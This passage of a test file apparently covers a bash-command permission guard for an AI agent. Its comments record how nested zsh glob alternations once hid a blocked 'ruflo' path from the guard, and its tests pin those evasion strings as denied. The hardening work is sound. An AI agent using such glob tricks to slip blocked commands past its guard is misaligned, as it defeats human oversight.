    './(a|b)/(c|d)/(e|f)/(g|h)/(i|j)/less',
    'echo (a|b) (c|d) (e|f) (g|h)',
    'ls (src|dist)/index.js',
    // One-alternative groups by the handful: inline-script and SQL syntax.
    "node -e 'a(1); b(2); c(3); d(4); e(5); f(6)'",
    'psql -c "CREATE TABLE t (a TEXT, b TEXT, c TEXT, d TEXT, e TEXT, f(1), g(2))"',
  ]
  it.each(allowControls)('control: %s -> allow', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  // The posture's price, pinned so it is a recorded decision: an alternation
  // wider than the cap denies even when it names no ruflo path, because the
  // guard cannot read it. Zero repository command lines are this wide (corpus,
  // 8,534 lines, 0 verdict differences).
  it('stated over-block: a wide alternation with no ruflo path -> deny glob-cap', () => {
    const verdict = decide(bashCall('ls (a|b)/(c|d)/(e|f)/(g|h)/(i|j)/(k|l)/(m|n)'), {})
    expect(verdict.action).toBe('deny')
    expect(verdict.json.hookSpecificOutput.permissionDecisionReason).toContain('glob-cap')
  })
})

// SMI-6903 round 21 F4 (pre-existing): one extra paren bypassed the H1 fix.
// zsh nests glob alternations, and zsh 5.9 INVOKES a decoy executable through
// `./((a|node_modules)|y)/.bin/tool`, `./(y|(a|node_modules))/.bin/tool` and
// `./(a(x|node_modules))/.bin/tool` (measured, the decoy actually ran); both
// bashes reject the syntax. `readWordGroup` skipped any group holding a nested
// paren, so the argv[0]-keyed H3/H5 checks never saw the real path.
describe('decide() — SMI-6903 F4: a NESTED glob group cannot hide a ruflo path', () => {
  // The three arms that constrain the fix: each ALLOWED on the pre-fix tree.
  const redArms = [
    './((a|node_modules)|y)/.bin/ruflo memory store',
    './(y|(a|node_modules))/.bin/ruflo memory store',
    './(a(x|node_modules))/.bin/ruflo memory store',
  ]
  it.each(redArms)('%s -> deny (the nested group is expanded too)', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('deny')
  })

  const allowControls = [
    // A non-ruflo binary reached the same way must stay allowed.
    './((node_modules|x)|y)/.bin/less',
    './((node_modules|x)|y)/.bin/tsc --noEmit',
    // An ordinary nested group in an argument.
    'echo ((a|b)|c)',
    'echo (a(b|c)|d)',
    'ls ((src|dist)|build)/index.js',
  ]
  it.each(allowControls)('control: %s -> allow', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  // PINS, not arms: each passes identically with the fix removed (measured).
  // Kept so the boundaries the fix does NOT move stay visible -- the flat
  // single-group path it already denied and the array-append shape it still
  // never expands. (The five-group row that sat here as an `allow` pin was a
  // leak, not a boundary; it is a `glob-cap` arm in the round 22 block.)
  const pinsThatPassWithoutTheFix: Array<[string, string]> = [
    ['./(node_modules|x)/.bin/ruflo memory store', 'deny'],
    ['compose_profile_args+=(--profile "$profile")', 'allow'],
  ]
  it.each(pinsThatPassWithoutTheFix)(
    'pin (does NOT constrain the fix): %s -> %s',
    (command, expected) => {
      expect(decide(bashCall(command), {}).action).toBe(expected)
    }
  )
})
